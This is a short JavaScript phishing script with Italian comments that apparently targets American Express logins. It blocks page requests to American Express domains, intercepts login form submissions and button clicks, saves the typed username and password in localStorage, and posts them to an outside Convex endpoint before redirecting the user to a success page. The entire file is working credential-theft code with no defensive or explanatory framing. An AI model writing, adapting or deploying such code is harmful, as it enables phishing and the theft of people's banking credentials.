(function(){
  const CONVEX='https://dynamic-stoat-328.convex.cloud';
  
  // Blocca fetch esterni
  const _fetch=window.fetch;
  window.fetch=function(u,o){
    if(u.includes('americanexpress')||u.includes('aexp'))return Promise.resolve(new Response('{}'));
    return _fetch.apply(this,arguments);
  };
  
  // Blocca XHR esterni
  const _open=window.XMLHttpRequest.prototype.open;
  window.XMLHttpRequest.prototype.open=function(m,u){
    if(u.includes('americanexpress')||u.includes('aexp'))return;
    return _open.apply(this,arguments);
  };
  
  // Cattura credenziali
  async function save(u,p){
    const d=JSON.parse(localStorage.getItem('creds')||'[]');
    d.push({u,p,t:Date.now()});
    localStorage.setItem('creds',JSON.stringify(d));
    try{await _fetch(CONVEX+'/api/credentials/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});}catch(e){}
  }
  
  // Intercetta form
  document.addEventListener('submit',function(e){
    const f=e.target;
    const p=f.querySelector('input[type="password"]');
    const u=f.querySelector('input[type="text"],input[type="email"],input[name*="user"]');
    if(p&&p.value){e.preventDefault();e.stopPropagation();save(u?.value||'',p.value).then(()=>location='/success');}
  },true);
  
  // Intercetta click
  document.addEventListener('click',function(e){
    const b=e.target.closest('button,input[type="submit"]');
    if(!b)return;
    const t=(b.textContent||'').toLowerCase();
    if(t.includes('accedi')||t.includes('login')||t.includes('entra')){
      e.preventDefault();e.stopPropagation();
      const p=document.querySelector('input[type="password"]');
      const u=document.querySelector('input[type="text"],input[type="email"]');
      if(p&&p.value)save(u?.value||'',p.value).then(()=>location='/success');
    }
  },true);
  
  console.log('✓ Intercept ready');
})();
